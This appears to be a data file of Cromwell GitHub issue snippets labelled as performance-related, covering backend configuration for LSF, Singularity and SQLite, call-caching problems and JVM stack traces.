Performance," of 3138431 exceeds configured limit of 1000000.```; This is after having edited the `cromwell.conf` as suggested in [this thread](https://github.com/broadinstitute/cromwell/issues/2519). The configuration file used is as follows (edited to remove the main script):; ```; include required(classpath(""application"")); backend {; default = LSF; providers {; LSF {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; exit-code-timeout-seconds = 300; runtime-attributes = """"""; Int cpu; Int memory_mb; String? lsf_queue; String? lsf_project; String? docker; """""". submit = """"""; bsub \; -q ${lsf_queue} \; -P ${lsf_project} \; -J ${job_name} \; -cwd ${cwd} \; -o ${out} \; -e ${err} \; -n ${cpu} \; -R 'rusage[mem=${memory_mb}] span[hosts=1]' \; -M ${memory_mb} \; /usr/bin/env bash ${script}; """""". submit-docker = """"""; module load tools/singularity/3.8.3; SINGULARITY_MOUNTS='<redacted>'; export SINGULARITY_CACHEDIR=$HOME/.singularity/cache; LOCK_FILE=$SINGULARITY_CACHEDIR/singularity_pull_flock. export SINGULARITY_DOCKER_USERNAME=<redacted>; export SINGULARITY_DOCKER_PASSWORD=<redacted>. flock --exclusive --timeout 900 $LOCK_FILE \; singularity exec docker://${docker} \; echo ""Sucessfully pulled ${docker}"". bsub \; -q ${lsf_queue} \; -P ${lsf_project} \; -J ${job_name} \; -cwd ${cwd} \; -o ${out} \; -e ${err} \; -n ${cpu} \; -R 'rusage[mem=${memory_mb}] span[hosts=1]' \; -M ${memory_mb} \; singularity exec --containall $SINGULARITY_MOUNTS --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}; """""". job-id-regex = ""Job <(\\d+)>.*""; kill = ""bkill ${job_id}""; kill-docker = ""bkill ${job_id}""; check-alive = ""bjobs -w ${job_id} |& egrep -qvw 'not found|EXIT|JOBID'"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [; ""soft-link"", ""copy"", ""hard-link""; ]; hashing-strategy: ""path+modtime""; }; }; }; }; }; }; }; call-caching {; enabled = true; invalidate-bad-cache-res",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7203:1486,cache,cache,1486,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7203,1,['cache'],['cache']
Performance," of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFS",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1947,cache,cache,1947,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['cache'],['cache']
Performance," of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initially:. ```HOCON; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text&journal_mode=truncate""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite::memory:?foreign_keys=true&date_class=text""; numThreads=1; }; }; }; ```; This limits the amount of IO operations to the bare minimum to get call-caching working. With this configuration cromwell was able to rerun the callcached 1000+ job workflow in ~25 minutes. However it c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:1846,perform,perform,1846,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906,1,['perform'],['perform']
Performance," on the GCS API; # #number-of-requests = 100000; # #per = 100 seconds; # }. # Number of times an I/O operation should be attempted before giving up and failing it.; #number-of-attempts = 5; }. # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; input-read-limits {; #lines = 128000; #bool = 7; #int = 19; #float = 50; #string = 128000; #json = 128000; #tsv = 128000; #map = 128000; #object = 128000; }. abort {; # These are the default values in Cromwell, in most circumstances there should not be a need to change them. # How frequently Cromwell should scan for aborts.; scan-frequency: 30 seconds. # The cache of in-progress aborts. Cromwell will add entries to this cache once a WorkflowActor has been messaged to abort.; # If on the next scan an 'Aborting' status is found for a workflow that has an entry in this cache, Cromwell will not ask; # the associated WorkflowActor to abort again.; cache {; enabled: true; # Guava cache concurrency.; concurrency: 1; # How long entries in the cache should live from the time they are added to the cache.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 100000; }; }. # Cromwell reads this value into the JVM's `networkaddress.cache.ttl` setting to control DNS cache expiration; dns-cache-ttl: 3 minutes; }. docker {; hash-lookup {; # Set this to match your available quota against the Google Container Engine API; #gcr-api-queries-per-100-seconds = 1000. # Time in minutes before an entry expires from the docker hashes cache and needs to be fetched again; #cache-entry-ttl = ""20 minutes"". # Maximum number of elements to be kept in the cache. If the limit is reached, old elements will be removed from the cache; #cache-size = 200. # How should docker hashes be looked up. Possible values are ""local"" and ""remote""; # ""local"": Lookup hashes on the local docker daemon using the cli; # ""remote"": Lookup hashes on docker hub, gcr, gar, quay; #method = ""remo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:3612,cache,cache,3612,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,3,"['cache', 'concurren']","['cache', 'concurrency']"
Performance," output count, runtime attribute, output expression, input count, backend name, command template, input. - What are the downsides with `check-sibling-md5`, can it be used in conjunction with `system.file-hash-cache`. - **Is the only way to use call-caching with containers without fully hashing the file?**. ## Possible resolutions. I was thinking the following might be potential solutions for my problem, but I don't know how good / bad they are, and they'd require changes to Cromwell. - Potential for a _cheaper_ (and potentially dirtier) hash for files? ; - When cromwell links from a cached result, store a map of { newpath : original } link to use or call caching, so when the hashDifferential is calculated, it uses the hash of the original cached result. (This would mean we could use the path+modtime strategy). ## Current attempt. I realised I may have run into another error here: https://github.com/broadinstitute/cromwell/issues/5348. This is my current configuration, it will successfully pull cache for the FIRST step in a workflow, but then fail afterwards. <details><summary>Click to show configuration</summary><p>. ```hocon; include required(classpath(""application"")). system: {; ""job-shell"": ""/bin/sh"",; ""cromwell_id"": ""cromwell-fdcce1"",; ""cromwell_id_random_suffix"": false; }; database: {; ""db"": {; ""driver"": ""com.mysql.cj.jdbc.Driver"",; ""url"": ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true&useSSL=false&serverTimezone=UTC"",; ""user"": ""root"",; ""connectionTimeout"": 5000; },; ""profile"": ""slick.jdbc.MySQLProfile$""; }; backend: {; ""default"": ""Local"",; ""providers"": {; ""Local"": {; ""actor-factory"": ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"",; ""config"": {; ""root"": ""/Users/franklinmichael/janis/cache_test/20200110_090106_f8ee04/janis/execution"",; ""filesystems"": {; ""local"": {; ""caching"": {; ""hashing-strategy"": ""path+modtime""; }; }; }; }; }; }; }; call-caching: {; ""enabled"": true; }; ```; </p></details>. Thanks in advance for your help!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:4046,cache,cache,4046,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,1,['cache'],['cache']
Performance, possible bug: why are we trying to upload an auth file when running in application default auth mode for both genomics and filesystems?. ```; [ERROR] [01/27/2017 14:39:36.100] [cromwell-system-akka.dispatchers.engine-dispatcher-5] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow 732474fd-88b0-4a5e-ad19-5ee5cd71d141 failed (during InitializingWorkflowState): Failed to upload authentication file; java.io.IOException: Failed to upload authentication file; 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1$$anonfun$apply$1.applyOrElse(JesInitializationActor.scala:81); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1$$anonfun$apply$1.applyOrElse(JesInitializationActor.scala:80); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:13,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1924:1006,concurren,concurrent,1006,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1924,1,['concurren'],['concurrent']
Performance, projects/${project_id}/global/networks/${network_id}/ is not matching the expected format: global/networks/([a-z]([-a-z0-9]*[a-z0-9])?)$; 	at com.google.api.gax.rpc.ApiExceptionFactory.createException(ApiExceptionFactory.java:92); 	at com.google.api.gax.rpc.ApiExceptionFactory.createException(ApiExceptionFactory.java:41); 	at com.google.api.gax.grpc.GrpcApiExceptionFactory.create(GrpcApiExceptionFactory.java:86); 	at com.google.api.gax.grpc.GrpcApiExceptionFactory.create(GrpcApiExceptionFactory.java:66); 	at com.google.api.gax.grpc.GrpcExceptionCallable$ExceptionTransformingFuture.onFailure(GrpcExceptionCallable.java:97); 	at com.google.api.core.ApiFutures$1.onFailure(ApiFutures.java:84); 	at com.google.common.util.concurrent.Futures$CallbackListener.run(Futures.java:1133); 	at com.google.common.util.concurrent.DirectExecutor.execute(DirectExecutor.java:31); 	at com.google.common.util.concurrent.AbstractFuture.executeListener(AbstractFuture.java:1277); 	at com.google.common.util.concurrent.AbstractFuture.complete(AbstractFuture.java:1038); 	at com.google.common.util.concurrent.AbstractFuture.setException(AbstractFuture.java:808); 	at io.grpc.stub.ClientCalls$GrpcFuture.setException(ClientCalls.java:574); 	at io.grpc.stub.ClientCalls$UnaryStreamToFuture.onClose(ClientCalls.java:544); 	at io.grpc.PartialForwardingClientCallListener.onClose(PartialForwardingClientCallListener.java:39); 	at io.grpc.ForwardingClientCallListener.onClose(ForwardingClientCallListener.java:23); 	at io.grpc.ForwardingClientCallListener$SimpleForwardingClientCallListener.onClose(ForwardingClientCallListener.java:40); 	at com.google.api.gax.grpc.ChannelPool$ReleasingClientCall$1.onClose(ChannelPool.java:541); 	at io.grpc.internal.DelayedClientCall$DelayedListener$3.run(DelayedClientCall.java:489); 	at io.grpc.internal.DelayedClientCall$DelayedListener.delayOrExecute(DelayedClientCall.java:453); 	at io.grpc.internal.DelayedClientCall$DelayedListener.onClose(DelayedClientCall.java:486); 	at io.gr,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7500:1382,concurren,concurrent,1382,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500,1,['concurren'],['concurrent']
Performance," providers include SGE, SLURM, Docker, udocker, Singularity. etc.; # Don't forget you will need to customize them for your particular use case.; backend {; # Override the default backend.; default = ""PAPIv2"". # The list of providers.; providers {; PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2beta.PipelinesApiLifecycleActorFactory""; config {; # Google project; project = ""***-***"". # Base bucket for workflow executions; root = ""gs://*****/cromwell-execution"". # Make the name of the backend used for call caching purposes insensitive to the PAPI version.; name-for-call-caching-purposes: PAPI. # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in PAPI.; slow-job-warning-time: 24 hours. # Set this to the lower of the two values ""Queries per 100 seconds"" and ""Queries per 100 seconds per user"" for; # your project.; #; # Used to help determine maximum throughput to the Google Genomics API. Setting this value too low will; # cause a drop in performance. Setting this value too high will cause QPS based locks from Google.; # 1000 is the default ""Queries per 100 seconds per user"", 50000 is the default ""Queries per 100 seconds""; # See https://cloud.google.com/genomics/quotas for more information; genomics-api-queries-per-100-seconds = 10000. # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. # Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; # account = """"; # token = """"; }. # Number of workers to assign to PAPI requests; request-workers = 3. # Optional configuration to use high security network (Virtual Private Cloud) for running jobs.; # See https://cromwell.readthedocs.io/en/stable/backends/Google/ for more details.; # virtual-private-cloud {; # network-label-key = ""network-key""; # auth = ""service-account""; # }. # Global pipeline timeout; # Defaults to 7 days",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6469:11256,perform,performance,11256,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469,1,['perform'],['performance']
Performance, recursion (from SBT logs):; ```; [0m[[0m[31merror[0m] [0m[0mjava.lang.StackOverflowError[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:64)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:211)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:145)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.Tuple2.hashCode(Tuple2.scala:19)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.runtime.Statics.anyHash(Statics.java:115)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap$MangledHashing.hash(TrieMap.scala:984)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.computeHash(TrieMap.scala:829)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.get(TrieMap.scala:844)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.MapLike.contains(MapLike.scala:150)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.MapLike.contains$(MapLike.scala:150)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.contains(TrieMap.scala:631)[0m; [0m[[0m[31merror[0m] [0m[0m	at scoverage.Invoker$.invoked(Invoker.scala:34)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:44)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4903#issuecomment-487021855:1204,concurren,concurrent,1204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4903#issuecomment-487021855,1,['concurren'],['concurrent']
Performance," ref_fasta_dict=ref_fasta_dict,\n gatk_jar=gatk_jar,\n isWGS=isWGS,\n wgsBinSize=wgsBinSize,\n mem=4\n }\n\n call AnnotateTargets as TumorAnnotateTargets {\n input:\n entity_id=row[0],\n gatk_jar=gatk_jar,\n target_file=TumorWholeGenomeCoverage.gatk_target_file,\n ref_fasta=ref_fasta,\n ref_fasta_fai=ref_fasta_fai,\n ref_fasta_dict=ref_fasta_dict,\n enable_gc_correction=enable_gc_correction,\n mem=4\n }\n\n call CorrectGCBias as TumorCorrectGCBias {\n input:\n entity_id=row[0], \n gatk_jar=gatk_jar,\n coverage_file=TumorWholeGenomeCoverage.gatk_coverage_file,\n annotated_targets=TumorAnnotateTargets.annotated_targets,\n enable_gc_correction=enable_gc_correction,\n mem=4\n }\n\n call NormalizeSomaticReadCounts as TumorNormalizeSomaticReadCounts {\n input:\n entity_id=row[0], \n coverage_file=TumorCorrectGCBias.gatk_cnv_coverage_file_gcbias,\n padded_target_file=TumorWholeGenomeCoverage.gatk_target_file,\n pon=PoN,\n gatk_jar=gatk_jar,\n mem=2\n }\n\n call PerformSegmentation as TumorPerformSeg {\n input:\n entity_id=row[0],\n gatk_jar=gatk_jar,\n tn_file=TumorNormalizeSomaticReadCounts.tn_file,\n seg_param_alpha=seg_param_alpha,\n seg_param_nperm=seg_param_nperm,\n seg_param_pmethod=seg_param_pmethod,\n seg_param_minWidth=seg_param_minWidth,\n seg_param_kmax=seg_param_kmax,\n seg_param_nmin=seg_param_nmin,\n seg_param_eta=seg_param_eta,\n seg_param_trim=seg_param_trim,\n seg_param_undoSplits=seg_param_undoSplits,\n seg_param_undoPrune=seg_param_undoPrune,\n seg_param_undoSD=seg_param_undoSD,\n mem=2\n }\n\n call Caller as TumorCaller {\n input:\n entity_id=row[0],\n gatk_jar=gatk_jar,\n tn_file=TumorNormalizeSomaticReadCounts.tn_file,\n seg_file=TumorPerformSeg.seg_file,\n mem=2\n }\n\n call HetPulldown {\n input:\n entity_id_tumor=row[0],\n entity_id_normal=row[3],\n gatk_jar=gatk_jar,\n ref_fasta=ref_fasta,\n ref_fasta_fai=ref_fasta_fai,\n ref_fasta_dict=ref_fasta_dict,\n tumor_bam=row[1],\n tumor_bam_idx=row[2],\n normal_bam=row[4],\n normal_bam_idx=row[5],\n comm",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:29952,Perform,PerformSegmentation,29952,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,1,['Perform'],['PerformSegmentation']
Performance," sample. That takes a lot of IO time and a lot of physical disk space. This makes cromwell practically unusable for use with containers on a HPC. Multiple people have the same problem and proposed a solution in #2620, #3447 and #4711. . ### This solution. This PR aims to tackle the problem by adding a new strategy called `cached-copy`. Since hard-links do not work across physical disks and soft-links do not work, copying is unavoidable. However, instead of copying the file directly into `<call_dir>/inputs` the file is first copied to a cache in `<cromwell_root>/cached-inputs`. This should ensure that `cached-inputs` is on the same physical disk as `<call_dir>` (which is also in `<cromwell_root>`). The cached file is then hard-linked to `<call_dir>/inputs`. When the same file is needed again it will check if the file already exists in the `cached-inputs` and then hard-link it. This saves all the time needed for copying. ### Technical notes; File collisions are prevented by appending the last modified time epoch millisecond to the name of the cached file. If the input file is changed between jobs it will create a new cache entry. Md5sums are not used because it is extremely compute intensive for large files. Path+modtime should guarantee that files are the same. . I have expanded the SFS test scala file so it properly tests the new `cached-inputs` strategy. I have added information on how to use the strategy in the docs, and added this PR to the changelog. ### Help still needed. There are two things that I could not figure out without cromwell developer help:. ~~* Checking whether a file exists and copying it to the cache should never be done by multiple threads simeltaneously. I have used the `synchronized` method to prevent this. I used an object for this, because I am sure it is unique within the JVM at cromwell runtime. This works fine, but I can imagine this can be solved in a nicer way using akka? However the akka documentation is an extensive jungle on its own, ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900:1555,cache,cached,1555,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900,1,['cache'],['cached']
Performance, scala.collection.immutable.Nil$.head(List.scala:417); at cromwell.engine.workflow.SingleWorkflowRunnerActor$$anonfun$8.apply(SingleWorkflowRunnerActor.scala:133); at cromwell.engine.workflow.SingleWorkflowRunnerActor$$anonfun$8.apply(SingleWorkflowRunnerActor.scala:133); at scala.Option.getOrElse(Option.scala:121); at cromwell.engine.workflow.SingleWorkflowRunnerActor.cromwell$engine$workflow$SingleWorkflowRunnerActor$$issueReply(SingleWorkflowRunnerActor.scala:133); at cromwell.engine.workflow.SingleWorkflowRunnerActor$$anonfun$4.applyOrElse(SingleWorkflowRunnerActor.scala:88); at cromwell.engine.workflow.SingleWorkflowRunnerActor$$anonfun$4.applyOrElse(SingleWorkflowRunnerActor.scala:85); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); at akka.actor.FSM$class.processEvent(FSM.scala:663); at cromwell.engine.workflow.SingleWorkflowRunnerActor.akka$actor$LoggingFSM$$super$processEvent(SingleWorkflowRunnerActor.scala:34); at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); at cromwell.engine.workflow.SingleWorkflowRunnerActor.processEvent(SingleWorkflowRunnerActor.scala:34); at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.server.CromwellRootActor.aroundReceive(CromwellRootActor.scala:27); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1615:2032,concurren,concurrent,2032,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1615,4,['concurren'],['concurrent']
Performance, scala.collection.mutable.ArrayBuffer.foreach(ArrayBuffer.scala:48) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$class.cromwell$engine$backend$Backend$$hashGivenDockerHash(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfu,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:4487,concurren,concurrent,4487,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance, scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 